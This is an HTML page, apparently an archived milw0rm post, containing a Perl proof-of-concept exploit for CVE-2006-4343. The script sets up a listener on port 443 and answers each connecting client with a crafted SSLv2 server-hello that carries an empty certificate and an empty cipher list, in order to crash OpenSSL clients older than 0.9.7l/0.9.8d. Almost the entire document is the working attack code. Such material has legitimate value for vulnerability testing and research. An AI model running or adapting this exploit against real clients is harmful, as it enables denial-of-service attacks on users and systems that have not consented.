<html><head><title>OpenSSL < 0.9.7l / 0.9.8d SSLv2 Client Crash Exploit</title></head><pre>#!/usr/bin/perl
# Copyright(c) Beyond Security
# Written by Noam Rathaus - based on beSTORM's SSL Server module
# Exploits vulnerability CVE-2006-4343 - where the SSL client can be crashed by special SSL serverhello response

use strict;
use IO::Socket;
my $sock = new IO::Socket::INET ( LocalPort =&gt; '443', Proto =&gt; 'tcp', Listen =&gt; 1, Reuse =&gt; 1, );
die &quot;Could not create socket: $!\n&quot; unless $sock;
 
my $TIMEOUT = 0.5;
my $line;
my $new_sock;
srand(time());

while ( $new_sock = $sock-&gt;accept() )
{
 printf (&quot;new connection\n&quot;);
 my $rin;
 my $line;
 my ($nfound, $timeleft) = select($rin, undef, undef, $TIMEOUT) &amp;&amp; recv($new_sock, $line, 1024, undef);

 my $ciphers = &quot;&quot;;
 my $ciphers_length = pack('n', length($ciphers));

 my $certificate = &quot;&quot;;
 my $certificate_length = pack('n', length($certificate));

 my $packet_sslv2 =
&quot;\x04&quot;.
&quot;\x01&quot;. # Hit (default 0x01)

&quot;\x00&quot;. # No certificate

&quot;\x00\x02&quot;.
$certificate_length.
$ciphers_length.
&quot;\x00\x10&quot;.
# Certificate
$certificate.
# Done
# Ciphers
$ciphers.
# Done
&quot;\xf5\x61\x1b\xc4\x0b\x34\x1b\x11\x3c\x52\xe9\x93\xd1\xfa\x29\xe9&quot;;

 my $ssl_length = pack('n', length($packet_sslv2) + 0x8000);
 $packet_sslv2 = $ssl_length . $packet_sslv2;

 print $new_sock $packet_sslv2;

 close($new_sock);
}

# milw0rm.com [2007-12-23]</pre></html>